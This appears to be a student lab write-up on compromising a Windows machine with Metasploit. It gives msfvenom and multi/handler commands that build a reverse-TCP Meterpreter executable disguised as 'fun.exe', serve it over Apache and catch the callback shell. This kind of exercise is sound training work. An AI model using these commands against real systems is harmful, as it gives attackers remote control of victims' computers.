# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="877" height="218" alt="Screenshot 2026-02-14 140210" src="https://github.com/user-attachments/assets/c38f2756-b6e1-47af-9dc5-db0e9d8e9a42" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="854" height="169" alt="Screenshot 2026-02-14 140401" src="https://github.com/user-attachments/assets/1e596e41-2e89-4fc3-8bd5-311097fc33c9" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="514" height="69" alt="Screenshot 2026-02-14 140501" src="https://github.com/user-attachments/assets/3dec26cd-b26b-49cd-94c8-f54c3b82a832" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="387" height="51" alt="Screenshot 2026-02-14 140547" src="https://github.com/user-attachments/assets/bf30c776-a99f-4780-8724-4b809726f6a5" />

Check the status of apache2
## OUTPUT:


<img width="789" height="58" alt="image" src="https://github.com/user-attachments/assets/59f6499e-7236-49d5-9e0e-3e0b1aff4f9c" />

Invoke msfconsole:
## OUTPUT:

<img width="742" height="352" alt="Screenshot 2026-02-14 144600" src="https://github.com/user-attachments/assets/0d0d41f1-f808-48d7-92a4-25c617af3822" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="858" height="616" alt="Screenshot 2026-02-14 144625" src="https://github.com/user-attachments/assets/2003b4a0-0a63-4054-b6c1-788ad8996eaa" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:


<img width="775" height="145" alt="Screenshot 2026-02-14 144733" src="https://github.com/user-attachments/assets/ef76cf3f-3a29-4ee0-a4f5-4c01d12372ac" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="1038" height="579" alt="image" src="https://github.com/user-attachments/assets/20a3dbf4-142a-4582-8e6d-96d68edc903f" />




On kali/parrot give the command exploit
## OUTPUT:
<img width="946" height="530" alt="image" src="https://github.com/user-attachments/assets/a4b3c035-b59f-4fb2-a0a7-9c6ce06e241a" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
